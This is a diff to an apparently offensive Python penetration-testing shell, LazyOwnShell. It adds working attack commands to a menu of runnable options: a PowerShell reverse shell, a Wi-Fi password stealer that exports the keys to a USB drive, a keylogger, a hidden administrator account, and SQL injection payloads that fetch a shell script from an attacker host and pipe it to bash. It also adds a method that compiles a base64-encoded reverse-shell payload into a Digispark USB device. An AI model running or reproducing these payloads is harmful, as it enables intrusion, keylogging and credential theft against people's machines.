@@ -5138,6 +5138,10 @@ class LazyOwnShell(Cmd):
             ("locate dump files", "locate dump"),
             ("locate priv files", "locate priv"),
             ("lsof LISTEN PORTS", "sudo lsof -i -P -n | grep LISTEN"),
+            ("WIN Rrev Shell", '$sm=(New-Object Net.Sockets.TCPClient("{lhost}",{lport})).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}'.replace('{lhost}',lhost).replace('{lport}',str(lport))),
+            ("WIN WifiGrab", "powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv c:\\windows\\temp\\temp.csv; cp c:\\windows\\temp\\temp.csv -destination $((gwmi -Query \\\"Select * from Win32_LogicalDisk where VolumeName='USB_DRIVE_LABEL'\\\").DeviceID); ri c:\\windows\\temp\\temp.csv -force"),
+            ("WIN Keylogger", "$code = {function My-Keypresses($Path=\"$env:temp\\mykeypress.txt\") \n{\n  $signatures = @\'\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \npublic static extern short GetAsyncKeyState(int virtualKeyCode); \n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int GetKeyboardState(byte[] keystate);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\n\'@\n\n  $API = Add-Type -MemberDefinition $signatures -Name \'Win32\' -Namespace API -PassThru\n    \n  $null = New-Item -Path $Path -ItemType File -Force\n\n  try\n  {\n\n    while ($true) {\n      Start-Sleep -Milliseconds 40\n      \n      for ($ascii = 9; $ascii -le 254; $ascii++) {\n        $state = $API::GetAsyncKeyState($ascii)\n\n        if ($state -eq -32767) {\n          $null = [console]::CapsLock\n\n          $virtualKey = $API::MapVirtualKey($ascii, 3)\n\n          $kbstate = New-Object Byte[] 256\n          $checkkbstate = $API::GetKeyboardState($kbstate)\n\n          $mychar = New-Object -TypeName System.Text.StringBuilder\n\n          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)\n\n          if ($success) \n          {\n            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) \n          }\n        }\n      }\n    }\n  }\n  finally\n  {\n  }\n}}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j"),
+            ("WIN CREATE USER", "powershell $pass = ConvertTo-SecureString \"Lazy0wn#1\" -AsPlainText -Force; New-LocalUser \"lazyown\" -Password $pass; Add-LocalGroupMember -Group \"Administrators\" -Member \"lazyown\" "),
             ("WIN find password", "findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml"),
             ("WIN List Directory", "dir"),
             ("WIN Find index.php in current dir", "dir /s /w /b index.php"),
@@ -5164,6 +5168,8 @@ class LazyOwnShell(Cmd):
             ("WIN WEB Inyection" ,'abc.txt | net user lazyown abc123! /add ; net localgroup administrators lazyown /add'),
             ("WIN ReverShell winbase64encode", f'echo -n "IEX(new-objectnet.webclient).downloadstring(\'http://{lhost}/Invoke-PowerShellTcp.ps1\')" | iconv -t UTF-16LE | base64 -w0'),
             ("WIN ReverShell echo", f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> sessions/Invoke-PowerShellTcp.ps1"),            
+            ("WIN enum Reg", "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"),
+            ("WIN enum Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
             ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
             ("WEB Cady", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"ping%3b\"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b"),
             ("WEB Cady yummy", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"curl+{lhost}/revshell.sh+|bash%3b\"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b ")
@@ -5172,14 +5178,14 @@ class LazyOwnShell(Cmd):
         
         for idx, (alias, cmd) in enumerate(commands_list):
             if cmd: 
-                print_msg(f"{idx + 1}. Alias: {alias}, Command: {cmd}")
+                print_msg(f"{idx + 1}{RESET}. Alias:{YELLOW} {alias}{RESET}, Command:{GREEN} {cmd}")
 
         try:
-            choice = int(input("Enter the number of the command you want to execute: ")) - 1
+            choice = int(input("    [!] Enter the number of the command you want to execute: ")) - 1
             if 0 <= choice < len(commands_list):
                 selected_alias, selected_cmd = commands_list[choice]
                 if selected_cmd: 
-                    confirm = input(f"Do you want to execute the command: {selected_cmd}? (y/n): ").strip().lower()
+                    confirm = input(f"   [?] Do you want to execute the command: {selected_cmd}? (y/n): ").strip().lower()
                     
                     if confirm == 'y':
                         print_warn(f"Executing command: {selected_cmd}")
@@ -13356,7 +13362,98 @@ class LazyOwnShell(Cmd):
         
         return
 
+    def do_lazyducky_digispark(self, line):
+        """
+        Compiles and uploads an .ino sketch to a Digispark device using Arduino CLI and Micronucleus.
 
+        This method checks if Arduino CLI and Micronucleus are installed on the system.
+        If they are not available, it installs them. It then compiles a Digispark sketch 
+        and uploads the generated .hex file to the Digispark device.
+
+        The method performs the following actions:
+        1. Checks for the presence of Arduino CLI and installs it if not available.
+        2. Configures Arduino CLI for Digispark if not already configured.
+        3. Generates a reverse shell payload and prepares the sketch for Digispark.
+        4. Compiles the prepared Digispark sketch using Arduino CLI.
+        5. Checks for the presence of Micronucleus and installs it if not available.
+        6. Uploads the compiled .hex file to the Digispark device using Micronucleus.
+
+        Args:
+            line (str): Command line input provided by the user, which may contain additional parameters.
+
+        Returns:
+            None: The function does not return any value but may modify the state of the system
+                by executing commands.
+        """
+
+        if not is_binary_present("arduino-cli"):
+            print_warn("Arduino CLI not found, installing...")
+            install_cli = "curl -fsSL https://raw.githubusercontent.com/arduino/arduino-cli/master/install.sh | sh"
+            os.system(install_cli)
+
+        print_msg("Configuring Arduino CLI for Digispark...")
+        os.system("arduino-cli core update-index")
+        os.system("arduino-cli core install digistump:avr")
+
+        if not is_binary_present("micronucleus"):
+            print_warn("Micronucleus not found, installing...")
+            os.system("sudo apt-get install -y micronucleus")
+
+        p.onecmd("createrevshell")
+        lhost = self.params["lhost"]
+        if not check_lhost(lhost):
+            return
+        rev = f"curl http://{lhost}/revshell.sh | bash"
+        print_msg(rev)
+
+        encoded_bytes = base64.b64encode(rev.encode('utf-8'))
+        encoded_str = encoded_bytes.decode('utf-8')
+        payload = f"echo '{encoded_str}' | base64 -d | bash"
+
+        print_msg(encoded_str)
+        print_msg(payload)
+
+        path = os.getcwd()
+        file = f"{path}/modules/digispark.ino"
+
+        if not is_exist(file):
+            return
+
+        with open(file, 'r') as f:
+            content = f.read()
+
+        content = content.replace("{payload}", payload)
+        os.system(f"mkdir {path}/sessions/revshell")
+        file_ino = f"{path}/sessions/revshell/revshell.ino"
+        with open(file_ino, 'w+') as f:
+            f.write(content)
+
+        if not is_exist(file_ino):
+            print_error("Error: revshell.ino file was not created.")
+            return
+        else:
+            with open(file_ino, 'r') as f:
+                content = f.read()
+                if not content.strip():
+                    print_error("Error: revshell.ino file is empty.")
+                    return
+
+        print_msg(f"Compiling the sketch {file_ino}...")
+        output_dir = f"{path}/sessions/revshell"
+        compile_command = f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --verbose --output-dir {output_dir}"
+        print_msg(compile_command)
+        os.system(compile_command)
+
+        hex_file_path = f"{path}/sessions/revshell/revshell.ino.hex" 
+        print_msg(f"Uploading the compiled file {hex_file_path} to Digispark...")
+        upload_command = f"micronucleus --run {hex_file_path}"
+        print_msg(upload_command)
+        os.system(upload_command)
+
+        print_msg("Upload completed.")
+        p.onecmd("nc")
+        return
+            
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
